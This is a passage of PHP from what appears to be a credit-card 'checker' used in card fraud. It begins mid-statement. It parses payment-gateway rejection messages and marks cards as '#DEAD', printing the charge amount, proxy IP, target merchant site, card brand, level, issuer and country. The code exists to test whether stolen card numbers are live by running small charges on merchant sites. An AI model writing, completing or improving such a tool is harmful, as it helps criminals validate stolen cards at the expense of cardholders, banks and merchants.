    <span style="color: #ff09b5ff; padding: 8px;"> INFO: '.$cardBrand.'-'.$cardtype.'-'.$cardlevel.' | '.$issuerName.' | '.$isoCountry.' <br><br>';


} elseif (strpos($Respo, 'The credit card type is not supported (Transaction Error) something is wrong.') !== false) {

         echo '<span style="color: #ffffffff; padding: 8px;"> #DEAD [THE CREDIT CARD TYPE IS NOT SUPPORTED][AMOUNT:'.$price1.'] ['.$ip.'] <a href="' . $hostname1 . '" target="_blank">SITE</a>'.$lineNumber.'<br>
    <span style="color: #ff09b5ff; padding: 8px;"> INFO: '.$cardBrand.'-'.$cardtype.'-'.$cardlevel.' | '.$issuerName.' | '.$isoCountry.' <br><br>';


} elseif (strpos($Respo, 'Transaction refused due to risk model (Transaction Error) something is wrong.') !== false) {


     echo '<span style="color: #ffffffff; padding: 8px;"> #DEAD [TRANSACTION REFUSED DUE TO RISK MODEL][AMOUNT:'.$price1.'] ['.$ip.'] <a href="' . $hostname1 . '" target="_blank">SITE</a>'.$lineNumber.'<br>
    <span style="color: #ff09b5ff; padding: 8px;"> INFO: '.$cardBrand.'-'.$cardtype.'-'.$cardlevel.' | '.$issuerName.' | '.$isoCountry.' <br><br>';


} elseif (strpos($Respo, 'This transaction cannot be processed. Please enter a valid credit card number and type. (Transaction Error) something is wrong.') !== false) {

         echo '<span style="color: #ffffffff; padding: 8px;"> #DEAD [ENTER VALID CREDIT CARD NUMBER][AMOUNT:'.$price1.'] ['.$ip.'] <a href="' . $hostname1 . '" target="_blank">SITE</a>'.$lineNumber.'<br>
    <span style="color: #ff09b5ff; padding: 8px;"> INFO: '.$cardBrand.'-'.$cardtype.'-'.$cardlevel.' | '.$issuerName.' | '.$isoCountry.' <br><br>';


} elseif (strpos($Respo, 'Please use a different payment card. (Transaction Error) something is wrong.') !== false) {


     echo '<span style="color: #ffffffff; padding: 8px;"> #DEAD [PLEASE USE A DIFFERENT PAYMENT CARD][AMOUNT:'.$price1.'] ['.$ip.'] <a href="' . $hostname1 . '" target="_blank">SITE</a>'.$lineNumber.'<br>
    <span style="color: #ff09b5ff; padding: 8px;"> INFO: '.$cardBrand.'-'.$cardtype.'-'.$cardlevel.' | '.$issuerName.' | '.$isoCountry.' <br><br>';


} elseif (strpos($Respo, 'Card type is not valid.') !== false) {
    
             echo '<span style="color: #ffffffff; padding: 8px;"> #DEAD [CARD TYPE IS NOT VALID][AMOUNT:'.$price1.'] ['.$ip.'] <a href="' . $hostname1 . '" target="_blank">SITE</a>'.$lineNumber.'<br>
    <span style="color: #ff09b5ff; padding: 8px;"> INFO: '.$cardBrand.'-'.$cardtype.'-'.$cardlevel.' | '.$issuerName.' | '.$isoCountry.' <br><br>';


} else {

    
         echo '<span style="color: #ffffffff; padding: 8px;"> #DEAD ['.$Respo.'][AMOUNT:'.$price1.'] ['.$ip.'] <a href="' . $hostname1 . '" target="_blank">SITE</a>'.$lineNumber.'<br>
    <span style="color: #ff09b5ff; padding: 8px;"> INFO: '.$cardBrand.'-'.$cardtype.'-'.$cardlevel.' | '.$issuerName.' | '.$isoCountry.' <br><br>';

}



?>